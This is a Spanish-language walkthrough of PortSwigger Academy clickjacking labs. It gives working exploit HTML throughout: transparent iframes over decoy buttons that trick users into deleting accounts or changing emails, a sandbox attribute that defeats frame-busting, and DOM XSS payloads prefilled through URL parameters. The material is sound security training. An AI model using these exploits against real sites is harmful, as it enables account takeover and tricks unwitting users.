# Clickjacking

## Lab: Basic clickjacking with CSRF token protection

### Enunciado

**Este laboratorio contiene una funcionalidad de inicio de sesión y un botón para eliminar la cuenta que está protegido con un token CSRF.** Un usuario **hará clic en elementos que muestren la palabra "click" en un sitio web señuelo. Crea un código HTML que incluya la página de cuenta en un iframe y engañe al usuario para que elimine su cuenta.** El laboratorio se considera resuelto **cuando la cuenta sea eliminada.**

**Puedes iniciar sesión en tu propia cuenta con las siguientes credenciales:**

* **Usuario:** `wiener`
* **Contraseña:** `peter`

> La víctima usará **Chrome**, así que prueba tu exploit en **ese navegador**.

### Resolución

Nos logueamos. Viendo el código fuente nos damos cuenta que hay CSRF token para intentar prevenir ese ataque. Vamos a hacer un `<iframe>` y un texto para hacer click.

```
<html>
    <head>  
        <style type="text/css">
            #targetWebsite {
                position:relative;
                width:700px;
                height:700px;
                opacity:0.0001;
                z-index:2;
            }

            #decoyWebsite {
                position:absolute;
                top:495px;
                left:60px;
                z-index:1;
            }
        </style>
    </head>
    <body>
        <div id="decoyWebsite">Click me</div>
        <iframe id="targetWebsite" src="https://0aae00b0048a89418005035e00c30052.web-security-academy.net/my-account"></iframe>
    </body>
</html>

```

Vemos el exploit y se sitúa correctamente para el botón de eliminar cuenta de manera simulada.

<figure><img src="../../.gitbook/assets/image (1490).png" alt=""><figcaption></figcaption></figure>

Lo enviamos a la víctima.

<figure><img src="../../.gitbook/assets/image (1491).png" alt=""><figcaption></figcaption></figure>

## Lab: Clickjacking with form input data prefilled from a URL parameter

### Enunciado

**Este laboratorio amplía el ejemplo básico de clickjacking del laboratorio: Basic clickjacking with CSRF token protection.**

El objetivo del laboratorio es **cambiar la dirección de correo electrónico del usuario** prellenando un formulario mediante un parámetro en la URL y **convenciendo al usuario para que haga clic inadvertidamente en un botón de "Update email".**

**Crea un código HTML que incluya la página de cuenta en un iframe y engañe al usuario para que actualice su dirección de correo electrónico al hacer clic en un señuelo con el texto "Click me".** El laboratorio se considera resuelto **cuando la dirección de correo electrónico haya sido cambiada.**

**Puedes iniciar sesión en tu propia cuenta con las siguientes credenciales:**

* **Usuario:** `wiener`
* **Contraseña:** `peter`

> La víctima usará **Chrome**, así que asegúrate de probar tu exploit en **ese navegador**.

### Resolución

Nos logueamos. En este laboratorio tenemos que actualizar el email.

<figure><img src="../../.gitbook/assets/image (1492).png" alt=""><figcaption></figcaption></figure>

Nos damos cuenta que podemos rellenar el campo email como una petición GET.

<figure><img src="../../.gitbook/assets/image (1493).png" alt=""><figcaption></figcaption></figure>

Esta vez lo hacemos con Burp Clickbandit. Copiamos y lo pegamos en la Dev Tools.

<figure><img src="../../.gitbook/assets/image (1494).png" alt=""><figcaption></figcaption></figure>

Seleccionamos start y el botón de actualizar el email. Terminamos y guardamos.

<figure><img src="../../.gitbook/assets/image (1495).png" alt=""><figcaption></figcaption></figure>

Con el código dado lo enviamos a la víctima. También de manera manual sería así.

```
<!DOCTYPE html>
<html>
<head>
    <style>
        .target {
            position: relative;
            z-index: 2;
            height: 600px;
            width: 1000px;
            opacity: 0.00001337;
        }.decoy {
            position: absolute;
            z-index: 1;
            top: 465px;
            left: 50px;
        }
    </style>
</head><body>
    <iframe class="target" src="https://0a7f00e804d54781a2b5b92300e9007c.web-security-academy.net/my-account?email=hola@hola.com" ></iframe>
    <div class="decoy">click here</div>
</body></html>
```

<figure><img src="../../.gitbook/assets/image (1496).png" alt=""><figcaption></figcaption></figure>

### Lab: Clickjacking with a frame buster script

### Enunciado

**Este laboratorio está protegido con un&#x20;**_**frame buster**_**&#x20;que evita que el sitio web se pueda mostrar en un iframe. Crea un código HTML que incluya la página de cuenta en un iframe y engañe al usuario para que cambie su dirección de correo electrónico al hacer clic en un señuelo con el texto "Click me".** El laboratorio se considera resuelto **cuando la dirección de correo electrónico haya sido cambiada.**

**Puedes iniciar sesión en tu propia cuenta con las siguientes credenciales:**

* **Usuario:** `wiener`
* **Contraseña:** `peter`

### Resolución

Nos logueamos y vemos el código fuente.

<figure><img src="../../.gitbook/assets/image (1497).png" alt=""><figcaption></figcaption></figure>

Aquí vemos que hay un código JavaScript que **verifica si la ventana actual es la principal (top)**.

Si **no está en la ventana superior**, **bloquea el contenido** para evitar ser cargado en un iframe. **Esta técnica se llama “Frame busting”.**

Para **evadirla**, podemos usar el atributo **sandbox** de HTML5:

```html
<iframe src="https://victim-website.com" sandbox="allow-forms"></iframe>
```

Si **omitimos** `allow-top-navigation` pero permitimos `allow-forms` o `allow-scripts`, **el frame buster no puede verificar si está en top**, quedando neutralizado.

Con esta técnica, podemos **crear un sitio falso que engañe al usuario para que actualice su email al hacer clic en "Click me"**.

Para **prellenar la dirección de email**, simplemente usamos un **parámetro GET**: `email`.

<figure><img src="../../.gitbook/assets/image (1498).png" alt=""><figcaption></figcaption></figure>

```
<html>
    <head>
        <style type="text/css">
            #targetWebsite {
                position:relative;
                width:700px;
                height:700px;
                opacity:0.0001;
                z-index:2;
            }

            #decoyWebsite {
                position:absolute;
                top:450px;
                left:75px;
                z-index:1;
            }
        </style>
    </head>
    <body>
        <div id="decoyWebsite">Click me</div>
        <iframe id="targetWebsite" src="https://0a070031032b0c1780129964000a0090.web-security-academy.net/my-account?email=prueba@prueba.com" sandbox="allow-forms"></iframe>
    </body>
</html>
```

Enviamos a la víctima.

<figure><img src="../../.gitbook/assets/image (1499).png" alt=""><figcaption></figcaption></figure>

## Lab: Exploiting clickjacking vulnerability to trigger DOM-based XSS

### Enunciado

Este laboratorio contiene una vulnerabilidad XSS que se activa al hacer clic. Construye un ataque de clickjacking que engañe al usuario para que haga clic en el botón "Click me" y ejecute la función `print()`.

> La víctima usará **Chrome**, así que asegúrate de **probar tu exploit en ese navegador**.

### Resolución

Enviamos un mensaje.

<figure><img src="../../.gitbook/assets/image (1500).png" alt=""><figcaption></figcaption></figure>

Al ver el código fuente nos damos cuenta de un script en JS.

<figure><img src="../../.gitbook/assets/image (1501).png" alt=""><figcaption></figcaption></figure>

Aquí la función **displayFeedbackMessage(name)** es interesante:

```javascript
feedbackResult.innerHTML = "Thank you for submitting feedback" + (name ? ", " + name : "") + "!";
```

Usa **innerHTML** (una función peligrosa) y **el input del usuario se inserta directamente sin codificación ni validación**.

Si el back-end **no valida la entrada**, es muy probable que sea vulnerable a **XSS basado en DOM**.

```html
<img src=errorpls onerror=alert(document.domain)>
```

<figure><img src="../../.gitbook/assets/image (1502).png" alt=""><figcaption></figcaption></figure>

Ahora podemos **combinar XSS basado en DOM con clickjacking**.

Primero, necesitamos **prellenar el payload de XSS** usando un parámetro GET junto con los demás campos requeridos:

```
/feedback?name=<img src=errorpls onerror=print()>&email=prueba@prueba.com&subject=subject&message=message
```

Así insertamos el payload directamente en el campo **name** para activar el XSS.

```
<style>
 iframe {
  position:relative;
  width: 1000px;
  height: 900px;
  opacity: 0.000001;
  z-index: 2;
 }
 div {
  position:absolute;
  top: 815px;
  left: 40px;
  z-index: 1;
 }
</style>
<div>Click Here to Login</div>
<iframe
src="https://0a6400a104b73b46801e443800140005.web-security-academy.net/feedback?name=<img src=1 onerror=print()>&email=prueba@prueba.com&subject=test&message=test#feedbackResult"></iframe>
```

<figure><img src="../../.gitbook/assets/image (1503).png" alt=""><figcaption></figcaption></figure>

## Lab: Multistep clickjacking

### Enunciado

**Este laboratorio tiene una funcionalidad de cuenta protegida con un token CSRF y también con un cuadro de diálogo de confirmación para evitar ataques de Clickjacking. Construye un ataque que engañe al usuario para que haga clic en el botón de eliminar cuenta y luego en el cuadro de confirmación, usando las acciones señuelo "Click me first" y "Click me next".** Necesitarás **dos elementos** para este laboratorio.

**Puedes iniciar sesión en tu propia cuenta con las siguientes credenciales:**

* **Usuario:** `wiener`
* **Contraseña:** `peter`

> La víctima usará **Chrome**, así que asegúrate de **probar tu exploit en ese navegador**.

### Resolución

Nos logueamos y vemos que para eliminar la cuenta hay que también confirmar por lo que hay que realizar dos movimientos.

```
<style>
	iframe {
		position:relative;
		width:500px;
		height: 700px;
		opacity: 0.5;
		z-index: 2;
	}
   .firstClick, .secondClick {
		position:absolute;
		top:495px;
		left:50px;
		z-index: 1;
	}
   .secondClick {
		top:285px;
		left:200px;
	}
</style>
<div class="firstClick">Click first</div>
<div class="secondClick">Click next</div>
<iframe src="https://0a9f00a704358e9b8094f35f0073009c.web-security-academy.net/my-account"></iframe>
```

Enviamos a la víctima.

<figure><img src="../../.gitbook/assets/image (1504).png" alt=""><figcaption></figcaption></figure>
